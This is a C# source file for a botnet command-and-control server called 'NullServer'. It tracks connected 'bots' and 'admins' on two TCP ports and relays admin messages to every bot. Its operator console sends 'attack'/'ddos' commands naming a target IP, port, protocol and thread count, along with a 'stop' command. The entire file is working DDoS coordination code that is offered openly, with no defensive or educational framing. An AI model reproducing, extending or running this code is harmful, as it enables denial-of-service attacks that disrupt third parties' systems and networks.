using SimpleTCP;
using System;
using System.Collections.Generic;
using System.Net.Sockets;
using System.Threading.Tasks;

namespace NullServer
{
    internal class ServerHandler
    {
        private readonly List<TcpClient> clients = new List<TcpClient>();
        private readonly List<TcpClient> admins = new List<TcpClient>();

        public async Task Start()
        {
            try
            {
                var server = new SimpleTcpServer();
                server.Start(6969);

                var adminServer = new SimpleTcpServer();
                adminServer.Start(6970);

                server.BroadcastLine("Loaded " + Program.name);
                server.BroadcastLine(" Version: " + Program.version);
                server.BroadcastLine(" Made by JoinException");

                
                server.ClientConnected += (sender, client) =>
                {
                    Console.WriteLine(Program.prefix + "Connected Bot: " + client.Client.RemoteEndPoint);
                    clients.Add(client);
                };

                server.ClientDisconnected += (sender, client) =>
                {
                    Console.WriteLine(Program.prefix + "Disconnected Bot: " + client.Client.RemoteEndPoint);
                    clients.Remove(client);
                };

                
                adminServer.ClientConnected += (sender, client) =>
                {
                    Console.WriteLine(Program.prefix + "Connected Admin: " + client.Client.RemoteEndPoint);
                    admins.Add(client);
                };

                adminServer.ClientDisconnected += (sender, client) =>
                {
                    Console.WriteLine(Program.prefix + "Disconnected Admin: " + client.Client.RemoteEndPoint);
                    admins.Remove(client);
                };

                adminServer.DataReceived += (sender, message) =>
                {
                    var client = message.TcpClient;
                    var msg = message.MessageString.Trim();
                    Console.WriteLine("Received from admin: " + msg);

                    if (msg.Length > 0)
                    {
                        Console.WriteLine("Broadcasting message to all clients.");
                        try
                        {
                            server.BroadcastLine(msg);
                        }
                        catch (Exception e)
                        {
                            Console.WriteLine("Error broadcasting message: " + e.Message);
                        }
                    }
                };


                while (true)
                {
                    string[] input = Console.ReadLine().Split(' ');
                    if (input[0] == "list")
                    {
                        Console.WriteLine("Admins:");
                        for (int i = 0; i < admins.Count; i++)
                        {
                            Console.WriteLine($"[{i}] {admins[i].Client.RemoteEndPoint}");
                        }

                        Console.WriteLine(" ");

                        Console.WriteLine("Clients:");
                        for (int i = 0; i < clients.Count; i++)
                        {
                            Console.WriteLine($"[{i}] {clients[i].Client.RemoteEndPoint}");
                        }

                        Console.WriteLine(" ");
                    }
                    else if (input[0] == "clear" || input[0] == "cls")
                    {
                        Console.Clear();
                    }
                    else if (input[0] == "attack" || input[0] == "ddos")
                    {
                        if (input.Length == 5)
                        {
                            server.BroadcastLine($"attack {input[1]} {input[2]} {input[3]} {input[4]}");
                        }
                        else
                        {
                            Console.WriteLine("Usage: attack [IP] [PORT] [TCP/UDP] [THREADS]");
                        }
                    }
                    else if (input[0] == "stop")
                    {
                        server.BroadcastLine("stop ");
                    }
                }
            }
            catch (Exception e)
            {
                Console.WriteLine("Exception: " + e.Message);
                Console.WriteLine(e.StackTrace);
            }
        }
    }
}
